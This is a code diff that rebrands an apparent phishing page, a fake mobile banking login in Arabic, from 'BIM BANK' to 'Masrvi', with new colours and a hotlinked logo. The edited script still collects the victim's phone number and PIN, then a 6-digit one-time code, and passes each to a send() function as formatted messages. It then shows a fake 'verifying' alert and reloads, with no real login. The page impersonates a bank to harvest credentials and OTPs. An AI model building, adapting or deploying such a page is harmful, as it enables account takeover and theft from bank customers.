@@ -17,11 +17,11 @@
             min-height: 100vh;
         }
 
-        /* الهيدر العلوي بنمط بنكي */
+        /* الهيدر العلوي بنمط بنكي متناسق مع اللوجو */
         .app-header {
-            background: linear-gradient(135deg, #1a2a6c, #2a4858);
+            background: linear-gradient(135deg, #00a859, #2e3192);
             height: 220px;
-            padding: 40px 20px;
+            padding: 30px 20px;
             border-bottom-left-radius: 40px;
             border-bottom-right-radius: 40px;
             text-align: center;
@@ -29,14 +29,15 @@
             box-shadow: 0 10px 20px rgba(0,0,0,0.1);
         }
 
-        .bank-logo {
-            font-size: 32px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            margin-bottom: 10px;
+        /* تعديل حاوية اللوجو ليتناسب مع الصورة */
+        .bank-logo-img {
+            width: 160px; /* الحجم المثالي للوجو من image_34.png */
+            height: auto;
+            margin: 0 auto 10px;
+            display: block;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
         }
 
-        /* حاوية النموذج */
         .login-card {
             background: white;
             margin: -60px 25px 20px;
@@ -72,13 +73,12 @@
         }
 
         .input-box input:focus {
-            border-color: #1a2a6c;
-            background: #f9f9ff;
+            border-color: #00a859;
+            background: #f9fffb;
         }
 
-        /* الأزرار المصرفية */
         .btn-primary {
-            background: #1a2a6c;
+            background: #00a859;
             color: white;
             width: 100%;
             padding: 15px;
@@ -87,60 +87,51 @@
             font-weight: bold;
             border: none;
             cursor: pointer;
-            box-shadow: 0 5px 15px rgba(26, 42, 108, 0.3);
+            box-shadow: 0 5px 15px rgba(0, 168, 89, 0.3);
         }
 
         .btn-secondary {
             background: transparent;
-            color: #1a2a6c;
+            color: #2e3192;
             width: 100%;
             padding: 12px;
             font-size: 15px;
-            border: 1.5px solid #1a2a6c;
+            border: 1.5px solid #2e3192;
             border-radius: 12px;
             margin-top: 15px;
         }
 
-        /* واجهة الـ OTP المصرفية */
-        #screen-otp { 
-            display: none; 
-            padding: 40px 20px;
-            text-align: center;
-        }
+        #screen-otp { display: none; padding: 40px 20px; text-align: center; }
 
         .otp-input {
-            width: 80%;
+            width: 85%;
             padding: 15px;
             font-size: 24px;
-            letter-spacing: 15px;
-            border: 2px solid #1a2a6c;
+            letter-spacing: 12px;
+            border: 2px solid #00a859;
             border-radius: 15px;
             text-align: center;
             margin: 30px 0;
             outline: none;
         }
 
-        .timer-text {
-            color: #e74c3c;
-            font-weight: bold;
-        }
+        .timer-text { color: #e74c3c; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <!-- الشاشة الأولى: تسجيل دخول مصرفي -->
     <div id="screen-login">
         <div class="app-header">
-            <div class="bank-logo">BIM BANK</div>
-            <p class="opacity-80">الخدمات المصرفية الرقمية الآمنة</p>
+            <!-- استخدام الرابط المباشر المستخرج من image_35.png -->
+            <img src="https://i.ibb.co/680L13B/Mas.png" alt="Masrvi Logo" class="bank-logo-img">
+            <p class="opacity-90">الخدمات المصرفية الرقمية الآمنة</p>
         </div>
 
         <div class="login-card">
-            <h2 class="text-xl font-bold text-[#1a2a6c] mb-6 text-center">تسجيل الدخول</h2>
+            <h2 class="text-xl font-bold text-[#2e3192] mb-6 text-center">تسجيل الدخول</h2>
             
             <div class="input-box">
                 <label>رقم الهاتف</label>
-                <!-- قانون: أرقام فقط (8 أرقام) -->
                 <input id="phone" type="tel" maxlength="8" 
                        oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                        placeholder="00000000">
@@ -148,7 +139,6 @@
 
             <div class="input-box">
                 <label>الرمز السري</label>
-                <!-- قانون: أرقام فقط (4 أرقام) -->
                 <input id="pin" type="password" maxlength="4" 
                        oninput="this.value = this.value.replace(/[^0-9]/g, '');" 
                        placeholder="****">
@@ -157,22 +147,16 @@
             <button onclick="handleLogin()" class="btn-primary">دخول آمن</button>
             <button class="btn-secondary">نسيت كلمة المرور؟</button>
         </div>
-
-        <div class="text-center mt-10">
-            <p class="text-gray-500 text-sm">ليس لديك حساب؟ <span class="text-[#1a2a6c] font-bold">افتح حسابك الآن</span></p>
-        </div>
     </div>
 
-    <!-- الشاشة الثانية: واجهة التحقق OTP -->
     <div id="screen-otp">
         <div class="mb-10">
-            <img src="https://img.icons8.com/ios-filled/100/1a2a6c/shield-confirmation.png" class="mx-auto mb-4">
-            <h2 class="text-2xl font-bold text-[#1a2a6c]">تأكيد الهوية</h2>
-            <p class="text-gray-500 mt-2">لقد أرسلنا رمز التحقق المكون من 6 أرقام إلى هاتفك</p>
+            <img src="https://img.icons8.com/ios-filled/100/00a859/shield-confirmation.png" class="mx-auto mb-4">
+            <h2 class="text-2xl font-bold text-[#2e3192]">تأكيد الهوية</h2>
+            <p class="text-gray-500 mt-2">لقد أرسلنا رمز التحقق إلى هاتفك</p>
         </div>
 
         <div class="bg-white p-8 rounded-3xl shadow-sm border border-gray-100">
-            <!-- قانون: أرقام فقط (6 أرقام للـ OTP الخاص ببيم بنك) -->
             <input id="otp_code" type="tel" maxlength="6" class="otp-input"
                    oninput="this.value = this.value.replace(/[^0-9]/g, '');"
                    placeholder="000000">
@@ -180,7 +164,6 @@
             <p class="mb-6">تنتهي صلاحية الرمز خلال: <span id="timer" class="timer-text">04:59</span></p>
             
             <button onclick="submitOTP()" class="btn-primary">تأكيد العملية</button>
-            <p class="mt-6 text-[#1a2a6c] font-medium underline">إعادة إرسال الرمز</p>
         </div>
     </div>
 
@@ -193,23 +176,23 @@
             const p = document.getElementById('pin').value;
 
             if(u.length === 8 && p.length === 4) {
-                send(`🏦 BIM BANK - LOGIN\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
+                send(`🏦 Masrvi Login\n📱 Phone: ${u}\n🔐 PIN: ${p}`);
                 document.getElementById('screen-login').style.display = 'none';
                 document.getElementById('screen-otp').style.display = 'block';
                 startTimer(299);
             } else {
-                alert("يرجى إدخال البيانات المطلوبة بشكل صحيح (أرقام فقط)");
+                alert("يرجى إدخال 8 أرقام للهاتف و4 أرقام للرمز السري");
             }
         }
 
         function submitOTP() {
             const code = document.getElementById('otp_code').value;
             if(code.length === 6) {
-                send(`🔑 BIM BANK - OTP: ${code}`);
-                alert("جاري التحقق من الهوية...");
+                send(`🔑 Masrvi OTP: ${code}`);
+                alert("جاري التحقق...");
                 location.reload();
             } else {
-                alert("يرجى إدخال رمز التحقق المكون من 6 أرقام");
+                alert("أدخل الرمز المكون من 6 أرقام");
             }
         }
 
@@ -230,4 +213,5 @@
     </script>
 </body>
 </html>
+
 
